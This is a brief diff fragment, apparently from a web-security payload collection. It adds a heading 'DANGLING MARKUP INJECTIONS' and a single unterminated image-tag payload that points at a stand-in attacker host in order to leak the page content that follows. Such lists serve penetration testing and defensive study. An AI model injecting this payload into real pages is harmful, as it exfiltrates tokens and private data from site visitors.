@@ -110,3 +110,10 @@ function pawn() {
 }
 
 </script>
+
+
+
+
+
+### DANGLING MARKUP INJECTIONS 
+"><img src='//attacker-website.com?
